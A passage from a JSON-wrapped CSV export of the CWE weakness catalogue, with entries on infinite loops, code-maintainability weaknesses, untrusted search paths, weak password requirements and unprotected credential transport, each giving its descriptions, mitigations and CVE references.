deadlock.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-3106::REFERENCE:CVE-2005-2456:DESCRIPTION:Chain: array index error (CWE-129) leads to deadlock (CWE-833):LINK:https://www.cve.org/CVERecord?id=CVE-2005-2456::\",,,\"::TAXONOMY NAME:The CERT Oracle Secure Coding Standard for Java (2011):ENTRY ID:LCK08-J:ENTRY NAME:Ensure actively held locks are released on exceptional conditions::\",::25::,\"\",\n835,\"Loop with Unreachable Exit Condition ('Infinite Loop')\",Base,Incomplete,\"The product contains an iteration or loop with an exit condition that cannot be reached, i.e., an infinite loop.\",\"If the loop can be influenced by an attacker, this weakness could allow attackers to consume excessive resources such as CPU or memory.\",::NATURE:ChildOf:CWE ID:834:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:834:VIEW ID:1003:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"\",\"\",,\"::SCOPE:Availability:IMPACT:DoS: Resource Consumption (CPU):IMPACT:DoS: Resource Consumption (Memory):IMPACT:DoS: Amplification:NOTE:An infinite loop will cause unexpected consumption of resources, such as CPU cycles or memory. The software's operation may slow down, or cause a long time to respond.::\",\"\",\"\",\"::REFERENCE:CVE-2022-22224:DESCRIPTION:Chain: an operating system does not properly process malformed Open Shortest Path First (OSPF) Type/Length/Value Identifiers (TLV) (CWE-703), which can cause the process to enter an infinite loop (CWE-835):LINK:https://www.cve.org/CVERecord?id=CVE-2022-22224::REFERENCE:CVE-2022-25304:DESCRIPTION:A Python machine communication platform did not account for receiving a malformed packet with a null size, causing the receiving function to never update the message buffer and be caught in an infinite loop.:LINK:https://www.cve.org/CVERecord?id=CVE-2022-25304::REFERENCE:CVE-2011-1027:DESCRIPTION:Chain: off-by-one error (CWE-193) leads to infinite loop (CWE-835) using invalid hex-encoded characters.:LINK:https://www.cve.org/CVERecord?id=CVE-2011-1027::REFERENCE:CVE-2011-1142:DESCRIPTION:Chain: self-referential values in recursive definitions lead to infinite loop.:LINK:https://www.cve.org/CVERecord?id=CVE-2011-1142::REFERENCE:CVE-2011-1002:DESCRIPTION:NULL UDP packet is never cleared from a queue, leading to infinite loop.:LINK:https://www.cve.org/CVERecord?id=CVE-2011-1002::REFERENCE:CVE-2006-6499:DESCRIPTION:Chain: web browser crashes due to infinite loop - bad looping logic [that relies on] floating point math [CWE-1339] to exit the loop [CWE-835]:LINK:https://www.cve.org/CVERecord?id=CVE-2006-6499::REFERENCE:CVE-2010-4476:DESCRIPTION:Floating point conversion routine cycles back and forth between two different values.:LINK:https://www.cve.org/CVERecord?id=CVE-2010-4476::REFERENCE:CVE-2010-4645:DESCRIPTION:Floating point conversion routine cycles back and forth between two different values.:LINK:https://www.cve.org/CVERecord?id=CVE-2010-4645::REFERENCE:CVE-2010-2534:DESCRIPTION:Chain: improperly clearing a pointer in a linked list leads to infinite loop.:LINK:https://www.cve.org/CVERecord?id=CVE-2010-2534::REFERENCE:CVE-2013-1591:DESCRIPTION:Chain: an integer overflow (CWE-190) in the image size calculation causes an infinite loop (CWE-835) which sequentially allocates buffers without limits (CWE-1325) until the stack is full.:LINK:https://www.cve.org/CVERecord?id=CVE-2013-1591::REFERENCE:CVE-2008-3688:DESCRIPTION:Chain: A denial of service may be caused by an uninitialized variable (CWE-457) allowing an infinite loop (CWE-835) resulting from a connection to an unresponsive server.:LINK:https://www.cve.org/CVERecord?id=CVE-2008-3688::\",,,\"::TAXONOMY NAME:OMG ASCSM:ENTRY ID:ASCSM-CWE-835::\",,\"\","
  },
  "doc-24e346c28a99e7901112d0c8868d1d59": {
    "content": "CWE-ID,Name,Weakness Abstraction,Status,Description,Extended Description,Related Weaknesses,Weakness Ordinalities,Applicable Platforms,Background Details,Alternate Terms,Modes Of Introduction,Exploitation Factors,Likelihood of Exploit,Common Consequences,Detection Methods,Potential Mitigations,Observed Examples,Functional Areas,Affected Resources,Taxonomy Mappings,Related Attack Patterns,Notes\n1099,\"Inconsistent Naming Conventions for Identifiers\",Base,Incomplete,\"The product's code, documentation, or other artifacts do not consistently use the same naming conventions for variables, callables, groups of related callables, I/O capabilities, data types, file names, or similar types of elements.\",\"This issue makes it more difficult to understand and/or maintain the product due to inconsistencies, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.\",::NATURE:ChildOf:CWE ID:1078:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Indirect::\",,\"\",\"\",\"\",\"\",,\"\",\"\",\"\",\"\",,,\"\",,\"\",\n1100,\"Insufficient Isolation of System-Dependent Functions\",Base,Incomplete,\"The product or code does not isolate system-dependent functionality into separate standalone modules.\",\"This issue makes it more difficult to maintain and/or port the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.\",::NATURE:ChildOf:CWE ID:1061:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Indirect::\",,\"\",\"\",\"\",\"\",,\"::SCOPE:Other:IMPACT:Reduce Maintainability::\",\"\",\"\",\"\",,,\"\",,\"\",\n1101,\"Reliance on Runtime Component in Generated Code\",Base,Incomplete,\"The product uses automatically-generated code that cannot be executed without a specific runtime support component.\",\"This issue makes it more difficult to maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.\",::NATURE:ChildOf:CWE ID:710:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Indirect::\",,\"\",\"\",\"\",\"\",,\"::SCOPE:Other:IMPACT:Reduce Maintainability::\",\"\",\"\",\"\",,,\"\",,\"\",\n1102,\"Reliance on Machine-Dependent Data Representation\",Base,Incomplete,\"The code uses a data representation that relies on low-level data representation or constructs that may vary across different processors, physical machines, OSes, or other physical components.\",\"This issue makes it more difficult to maintain and/or port the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.\",::NATURE:ChildOf:CWE ID:758:VIEW ID:1000:ORDINAL:Primary::NATURE:PeerOf:CWE ID:1105:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Indirect::\",,\"\",\"\",\"\",\"\",,\"::SCOPE:Other:IMPACT:Reduce Maintainability::\",\"\",\"\",\"\",,,\"\",,\"\",\n1103,\"Use of Platform-Dependent Third Party Components\",Base,Incomplete,\"The product relies on third-party components that do not provide equivalent functionality across all desirable platforms.\",\"This issue makes it more difficult to maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.\",::NATURE:ChildOf:CWE ID:758:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Indirect::\",,\"\",\"\",\"\",\"\",,\"::SCOPE:Other:IMPACT:Reduce Maintainability::\",\"\",\"\",\"\",,,\"\",,\"\",\n1104,\"Use of Unmaintained Third Party Components\",Base,Incomplete,\"The product relies on third-party components that are not actively supported or maintained by the original developer or a trusted proxy for the original developer.\",\"Reliance on components that are no longer maintained can make it difficult or impossible to fix significant bugs, vulnerabilities, or quality issues. In effect, unmaintained code can become obsolete. This issue makes it more difficult to maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.\",::NATURE:ChildOf:CWE ID:1357:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Indirect::\",::TECHNOLOGY CLASS:Not Technology-Specific:TECHNOLOGY PREVALENCE:Undetermined::TECHNOLOGY CLASS:ICS/OT:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"\",\"\",,\"::SCOPE:Other:IMPACT:Reduce Maintainability::\",\"\",\"\",\"\",,,\"\",,\"\",\n1105,\"Insufficient Encapsulation of Machine-Dependent Functionality\",Base,Incomplete,\"The product or code uses machine-dependent functionality, but it does not sufficiently encapsulate or isolate this functionality from the rest of the code.\",\"This issue makes it more difficult to port or maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.\",::NATURE:ChildOf:CWE ID:758:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:1061:VIEW ID:1000::,\"::ORDINALITY:Indirect::\",,\"\",\"\",\"\",\"\",,\"::SCOPE:Other:IMPACT:Reduce Maintainability::\",\"\",\"\",\"\",,,\"\",,\"\",\n1106,\"Insufficient Use of Symbolic Constants\",Base,Incomplete,\"The source code uses literal constants that may need to change or evolve over time, instead of using symbolic constants.\",\"This issue makes it more difficult to maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.\",::NATURE:ChildOf:CWE ID:1078:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Indirect::\",,\"\",\"\",\"\",\"\",,\"::SCOPE:Other:IMPACT:Reduce Maintainability::\",\"\",\"\",\"\",,,\"\",,\"\",\n1107,\"Insufficient Isolation of Symbolic Constant Definitions\",Base,Incomplete,\"The source code uses symbolic constants, but it does not sufficiently place the definitions of these constants into a more centralized or isolated location.\",\"This issue makes it more difficult to maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.\",::NATURE:ChildOf:CWE ID:1078:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Indirect::\",,\"\",\"\",\"\",\"\",,\"::SCOPE:Other:IMPACT:Reduce Maintainability::\",\"\",\"\",\"\",,,\"\",,\"\",\n1108,\"Excessive Reliance on Global Variables\",Base,Incomplete,\"The code is structured in a way that relies too much on using or setting global variables throughout various points in the code, instead of preserving the associated information in a narrower, more local context.\",\"This issue makes it more difficult to maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.\",::NATURE:ChildOf:CWE ID:1076:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Indirect::\",,\"\",\"\",\"\",\"\",,\"::SCOPE:Other:IMPACT:Reduce Maintainability::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"\",\"\",,,\"\",,\"\",\n1109,\"Use of Same Variable for Multiple Purposes\",Base,Incomplete,\"The code contains a callable, block, or other code element in which the same variable is used to control more than one unique task or store more than one instance of data.\",\"Use of the same variable for multiple purposes can make it more difficult for a person to read or understand the code, potentially hiding other quality issues. This issue makes it more difficult to maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.\",::NATURE:ChildOf:CWE ID:1078:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Indirect::\",,\"\",\"\",\"\",\"\",,\"::SCOPE:Other:IMPACT:Reduce Maintainability::\",\"\",\"\",\"\",,,\"\",,\"\",\n1110,\"Incomplete Design Documentation\",Base,Incomplete,\"The product's design documentation does not adequately describe control flow, data flow, system initialization, relationships between tasks, components, rationales, or other important aspects of the design.\",\"\",::NATURE:ChildOf:CWE ID:1059:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Indirect::\",::TECHNOLOGY CLASS:Not Technology-Specific:TECHNOLOGY PREVALENCE:Undetermined::TECHNOLOGY CLASS:ICS/OT:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"\",\"\",,\"\",\"\",\"\",\"\",,,\"\",,\"\",\n1111,\"Incomplete I/O Documentation\",Base,Incomplete,\"The product's documentation does not adequately define inputs, outputs, or system/software interfaces.\",\"\",::NATURE:ChildOf:CWE ID:1059:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Indirect::\",,\"\",\"\",\"\",\"\",,\"\",\"\",\"\",\"\",,,\"\",,\"\",\n1112,\"Incomplete Documentation of Program Execution\",Base,Incomplete,\"The document does not fully define all mechanisms that are used to control or influence how product-specific programs are executed.\",\"This includes environmental variables, configuration files, registry keys, command-line switches or options, or system settings.\",::NATURE:ChildOf:CWE ID:1059:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Indirect::\",,\"\",\"\",\"\",\"\",,\"\",\"\",\"\",\"\",,,\"\",,\"\",\n1113,\"Inappropriate Comment Style\",Base,Incomplete,\"The source code uses comment styles or formats that are inconsistent or do not follow expected standards for the product.\",\"This issue makes it more difficult to maintain the product due to insufficient legibility, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.\",::NATURE:ChildOf:CWE ID:1078:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Indirect::\",,\"\",\"\",\"\",\"\",,\"\",\"\",\"\",\"\",,,\"\",,\"\",\n1114,\"Inappropriate Whitespace Style\",Base,Incomplete,\"The source code contains whitespace that is inconsistent across the code or does not follow expected standards for the product.\",\"This issue makes it more difficult to understand and maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.\",::NATURE:ChildOf:CWE ID:1078:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Indirect::\",,\"\",\"\",\"\",\"\",,\"\",\"\",\"\",\"\",,,\"\",,\"\",\n1115,\"Source Code Element without Standard Prologue\",Base,Incomplete,\"The source code contains elements such as source files that do not consistently provide a prologue or header that has been standardized for the project.\",\"The lack of a prologue can make it more difficult to accurately and quickly understand the associated code. Standard prologues or headers may contain information such as module name, version number, author, date, purpose, function, assumptions, limitations, accuracy considerations, etc. This issue makes it more difficult to maintain the product due to insufficient analyzability, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.\",::NATURE:ChildOf:CWE ID:1078:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Indirect::\",,\"\",\"\",\"\",\"\",,\"\",\"\",\"\",\"\",,,\"\",,\"\",\n1116,\"Inaccurate Comments\",Base,Incomplete,\"The source code contains comments that do not accurately describe or explain aspects of the portion of the code with which the comment is associated.\",\"When a comment does not accurately reflect the associated code elements, this can introduce confusion to a reviewer (due to inconsistencies) or make it more difficult and less efficient to validate that the code is implementing the intended behavior correctly. This issue makes it more difficult to maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.\",::NATURE:ChildOf:CWE ID:1078:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Indirect::\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"\",\"\",,\"::SCOPE:Other:IMPACT:Reduce Maintainability::\",\"\",\"::PHASE:Implementation:DESCRIPTION:Verify that each comment accurately reflects what is intended to happen during execution of the code.::\",\"\",,,\"\",,\"\",\n426,\"Untrusted Search Path\",Base,Stable,\"The product searches for critical resources using an externally-supplied search path that can point to resources that are not under the product's direct control.\",\"This might allow attackers to execute their own programs, access unauthorized data files, or modify configuration in unexpected ways. If the product uses a search path to locate critical resources such as programs, then an attacker could modify that search path to point to a malicious program, which the targeted product would then execute. The problem extends to any type of critical resource that the product trusts. Some of the most common variants of untrusted search path are: In various UNIX and Linux-based systems, the PATH environment variable may be consulted to locate executable programs, and LD_PRELOAD may be used to locate a separate library. In various Microsoft-based systems, the PATH environment variable is consulted to locate a DLL, if the DLL is not found in other paths that appear earlier in the search order.\",::NATURE:ChildOf:CWE ID:642:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:668:VIEW ID:1003:ORDINAL:Primary::NATURE:ChildOf:CWE ID:673:VIEW ID:1000::NATURE:PeerOf:CWE ID:427:VIEW ID:1000::NATURE:PeerOf:CWE ID:428:VIEW ID:1000::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Not OS-Specific:OPERATING SYSTEM PREVALENCE:Undetermined::,\"\",\"::TERM:Untrusted Path::\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Integrity:SCOPE:Confidentiality:SCOPE:Availability:SCOPE:Access Control:IMPACT:Gain Privileges or Assume Identity:IMPACT:Execute Unauthorized Code or Commands:NOTE:There is the potential for arbitrary code execution with privileges of the vulnerable program.::SCOPE:Availability:IMPACT:DoS: Crash, Exit, or Restart:NOTE:The program could be redirected to the wrong files, potentially triggering a crash or hang when the targeted file is too large or does not have the expected format.::SCOPE:Confidentiality:IMPACT:Read Files or Directories:NOTE:The program could send the output of unauthorized files to the attacker.::\",\"::METHOD:Black Box:DESCRIPTION:Use monitoring tools that examine the software's process as it interacts with the operating system and the network. This technique is useful in cases when source code is unavailable, if the software was not developed by you, or if you want to verify that the build phase did not introduce any new weaknesses. Examples include debuggers that directly attach to the running process; system-call tracing utilities such as truss (Solaris) and strace (Linux); system activity monitors such as FileMon, RegMon, Process Monitor, and other Sysinternals utilities (Windows); and sniffers and protocol analyzers that monitor network traffic. Attach the monitor to the process and look for library functions and system calls that suggest when a search path is being used. One pattern is when the program performs multiple accesses of the same file but in different directories, with repeated failures until the proper filename is found. Library calls such as getenv() or their equivalent can be checked to see if any path-related variables are being accessed.::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::METHOD:Manual Analysis:DESCRIPTION:Use tools and techniques that require manual (human) analysis, such as penetration testing, threat modeling, and interactive tools that allow the tester to record and modify an active session. These may be more effective than strictly automated techniques. This is especially the case with weaknesses that are related to design and business rules.::\",\"::PHASE:Architecture and Design Implementation:STRATEGY:Attack Surface Reduction:DESCRIPTION:Hard-code the search path to a set of known-safe values (such as system directories), or only allow them to be specified by the administrator in a configuration file. Do not allow these settings to be modified by an external party. Be careful to avoid related weaknesses such as CWE-426 and CWE-428.::PHASE:Implementation:DESCRIPTION:When invoking other programs, specify those programs using fully-qualified pathnames. While this is an effective approach, code that uses fully-qualified pathnames might not be portable to other systems that do not use the same pathnames. The portability can be improved by locating the full-qualified paths in a centralized, easily-modifiable location within the source code, and having the code refer to these paths.::PHASE:Implementation:DESCRIPTION:Remove or restrict all environment settings before invoking other programs. This includes the PATH environment variable, LD_LIBRARY_PATH, and other settings that identify the location of code libraries, and any application-specific search paths.::PHASE:Implementation:DESCRIPTION:Check your search path before use and remove any elements that are likely to be unsafe, such as the current working directory or a temporary files directory.::PHASE:Implementation:DESCRIPTION:Use other functions that require explicit paths. Making use of any of the other readily available functions that require explicit paths is a safe way to avoid this problem. For example, system() in C does not require a full path since the shell can take care of it, while execl() and execv() require a full path.::\",\"::REFERENCE:CVE-1999-1120:DESCRIPTION:Application relies on its PATH environment variable to find and execute program.:LINK:https://www.cve.org/CVERecord?id=CVE-1999-1120::REFERENCE:CVE-2008-1810:DESCRIPTION:Database application relies on its PATH environment variable to find and execute program.:LINK:https://www.cve.org/CVERecord?id=CVE-2008-1810::REFERENCE:CVE-2007-2027:DESCRIPTION:Chain: untrusted search path enabling resultant format string by loading malicious internationalization messages.:LINK:https://www.cve.org/CVERecord?id=CVE-2007-2027::REFERENCE:CVE-2008-3485:DESCRIPTION:Untrusted search path using malicious .EXE in Windows environment.:LINK:https://www.cve.org/CVERecord?id=CVE-2008-3485::REFERENCE:CVE-2008-2613:DESCRIPTION:setuid program allows compromise using path that finds and loads a malicious library.:LINK:https://www.cve.org/CVERecord?id=CVE-2008-2613::REFERENCE:CVE-2008-1319:DESCRIPTION:Server allows client to specify the search path, which can be modified to point to a program that the client has uploaded.:LINK:https://www.cve.org/CVERecord?id=CVE-2008-1319::\",::Program Invocation::Code Libraries::,::System Process::,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Untrusted Search Path::TAXONOMY NAME:CLASP:ENTRY NAME:Relative path library search::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:ENV03-C:ENTRY NAME:Sanitize the environment when invoking external programs::\",::38::,\"\",\n521,\"Weak Password Requirements\",Base,Draft,\"The product does not require that users should have strong passwords, which makes it easier for attackers to compromise user accounts.\",\"Authentication mechanisms often rely on a memorized secret (also known as a password) to provide an assertion of identity for a user of a system. It is therefore important that this password be of sufficient complexity and impractical for an adversary to guess. The specific requirements around how complex a password needs to be depends on the type of system being protected. Selecting the correct password requirements and enforcing them through implementation are critical to the overall success of the authentication mechanism.\",::NATURE:ChildOf:CWE ID:1391:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:287:VIEW ID:1003:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::TECHNOLOGY CLASS:Not Technology-Specific:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design:NOTE:COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic.::PHASE:Implementation:NOTE:Not enforcing the password policy stated in a products design can allow users to create passwords that do not provide the necessary level of protection.::\",\"\",,\"::SCOPE:Access Control:IMPACT:Gain Privileges or Assume Identity:NOTE:An attacker could easily guess user passwords and gain access user accounts.::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"::PHASE:Architecture and Design:DESCRIPTION:A product's design should require adherance to an appropriate password policy. Specific password requirements depend strongly on contextual factors, but it is recommended to contain the following attributes: Enforcement of a minimum and maximum length Restrictions against password reuse Restrictions against using common passwords Restrictions against using contextual string in the password (e.g., user id, app name) Depending on the threat model, the password policy may include several additional attributes. Complex passwords requiring mixed character sets (alpha, numeric, special, mixed case) Increasing the range of characters makes the password harder to crack and may be appropriate for systems relying on single factor authentication. Unfortunately, a complex password may be difficult to memorize, encouraging a user to select a short password or to incorrectly manage the password (write it down). Another disadvantage of this approach is that it often does not result in a significant increases in overal password complexity due to people's predictable usage of various symbols. Large Minimum Length (encouraging passphrases instead of passwords) Increasing the number of characters makes the password harder to crack and may be appropriate for systems relying on single factor authentication. A disadvantage of this approach is that selecting a good passphrase is not easy and poor passwords can still be generated. Some prompting may be needed to encourage long un-predictable passwords. Randomly Chosen Secrets Generating a password for the user can help make sure that length and complexity requirements are met, and can result in secure passwords being used. A disadvantage of this approach is that the resulting password or passpharse may be too difficult to memorize, encouraging them to be written down. Password Expiration Requiring a periodic password change can reduce the time window that an adversary has to crack a password, while also limiting the damage caused by password exposures at other locations. Password expiration may be a good mitigating technique when long complex passwords are not desired. See NIST 800-63B [REF-1053] for further information on password requirements.::PHASE:Architecture and Design:DESCRIPTION:Consider a second authentication factor beyond the password, which prevents the password from being a single point of failure. See CWE-308 for further information.::PHASE:Implementation:DESCRIPTION:Consider implementing a password complexity meter to inform users when a chosen password meets the required attributes.::\",\"::REFERENCE:CVE-2020-4574:DESCRIPTION:key server application does not require strong passwords:LINK:https://www.cve.org/CVERecord?id=CVE-2020-4574::\",,,\"::TAXONOMY NAME:OWASP Top Ten 2004:ENTRY ID:A3:ENTRY NAME:Broken Authentication and Session Management:MAPPING FIT:CWE More Specific::\",::112::16::49::509::55::555::561::565::70::,\"\",\n523,\"Unprotected Transport of Credentials\",Base,Incomplete,\"Login pages do not use adequate measures to protect the user name and password while they are in transit from the client to the server.\",\"\",::NATURE:ChildOf:CWE ID:522:VIEW ID:1000:ORDINAL:Primary::NATURE:CanAlsoBe:CWE ID:312:VIEW ID:1000::,\"\",,\"::SSL (Secure Socket Layer) provides data confidentiality and integrity to HTTP. By encrypting HTTP messages, SSL protects from attackers eavesdropping or altering message contents.::\",\"\",\"::PHASE:Architecture and Design:NOTE:OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.::\",\"\",,\"::SCOPE:Access Control:IMPACT:Gain Privileges or Assume Identity::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"::PHASE:Operation System Configuration:DESCRIPTION:Enforce SSL use for the login page or any page used to transmit user credentials or other sensitive information. Even if the entire site does not use SSL, it MUST use SSL for login. Additionally, to help prevent phishing attacks, make sure that SSL serves the login page. SSL allows the user to verify the identity of the server to which they are connecting. If the SSL serves login page, the user can be certain they are talking to the proper end system. A phishing attack would typically redirect a user to a site that does not have a valid trusted server certificate issued from an authorized supplier.::\",\"\",,,\"::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP23:ENTRY NAME:Exposed Data::\",::102::,\"\",\n1117,\"Callable with Insufficient Behavioral Summary\",Base,Incomplete,\"The code contains a function or method whose signature and/or associated inline documentation does not sufficiently describe the callable's inputs, outputs, side effects, assumptions, or return codes.\",\"This issue makes it more difficult to maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.\",::NATURE:ChildOf:CWE ID:1078:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Indirect::\",,\"\",\"\",\"\",\"\",,\"::SCOPE:Other:IMPACT:Reduce Maintainability::\",\"\",\"\",\"\",,,\"\",,\"\",\n1118,\"Insufficient Documentation of Error Handling Techniques\",Base,Incomplete,\"The documentation does not sufficiently describe the techniques that are used for error handling, exception processing, or similar mechanisms.\",\"Documentation may need to cover error handling techniques at multiple layers, such as module, executable, compilable code unit, or callable.\",::NATURE:ChildOf:CWE ID:1059:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Indirect::\",,\"\",\"\",\"\",\"\",,\"\",\"\",\"\",\"\",,,\"\",,\"\",\n1119,\"Excessive Use of Unconditional Branching\",Base,Incomplete,\"The code uses too many unconditional branches (such as goto).\",\"This issue makes it more difficult to understand and/or maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.\",::NATURE:ChildOf:CWE ID:1120:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Indirect::\",,\"\",\"\",\"\",\"\",,\"::SCOPE:Other:IMPACT:Reduce Maintainability::\",\"\",\"\",\"\",,,\"\",,\"\",\n1121,\"Excessive McCabe Cyclomatic Complexity\",Base,Incomplete,\"The code contains McCabe cyclomatic complexity that exceeds a desirable maximum.\",\"This issue makes it more difficult to understand and/or maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.\",::NATURE:ChildOf:CWE ID:1120:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Indirect::\",,\"\",\"\",\"\",\"\",,\"\",\"\",\"\",\"\",,,\"::TAXONOMY NAME:OMG ASCMM:ENTRY ID:ASCMM-MNT-11::\",,\"\",\n1122,\"Excessive Halstead Complexity\",Base,Incomplete,\"The code is structured in a way that a Halstead complexity measure exceeds a desirable maximum.\",\"A variety of Halstead complexity measures exist, such as program vocabulary size or volume. This issue makes it more difficult to understand and/or maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.\",::NATURE:ChildOf:CWE ID:1120:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Indirect::\",,\"\",\"\",\"\",\"\",,\"::SCOPE:Other:IMPACT:Reduce Maintainability::\",\"\",\"\",\"\",,,\"\",,\"\",\n1123,\"Excessive Use of Self-Modifying Code\",Base,Incomplete,\"The product uses too much self-modifying code.\",\"This issue makes it more difficult to understand or maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.\",::NATURE:ChildOf:CWE ID:1120:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Indirect::\",,\"\",\"\",\"\",\"\",,\"::SCOPE:Other:IMPACT:Reduce Maintainability::\",\"\",\"\",\"\",,,\"\",,\"\",\n1124,\"Excessively Deep Nesting\",Base,Incomplete,\"The code contains a callable or other code grouping in which the nesting / branching is too deep.\",\"This issue makes it more difficult to maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.\",::NATURE:ChildOf:CWE ID:1120:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Indirect::\",,\"\",\"\",\"\",\"\",,\"::SCOPE:Other:IMPACT:Reduce Maintainability::\",\"\",\"\",\"\",,,\"\",,\"\",\n1125,\"Excessive Attack Surface\",Base,Incomplete,\"The product has an attack surface whose quantitative measurement exceeds a desirable maximum.\",\"Originating from software security, an attack surface measure typically reflects the number of input points and output points that can be utilized by an untrusted party, i.e. a potential attacker. A larger attack surface provides more places to attack, and more opportunities for developers to introduce weaknesses. In some cases, this measure may reflect other aspects of quality besides security; e.g., a product with many inputs and outputs may require a large number of tests in order to improve code coverage.\",::NATURE:ChildOf:CWE ID:1120:VIEW 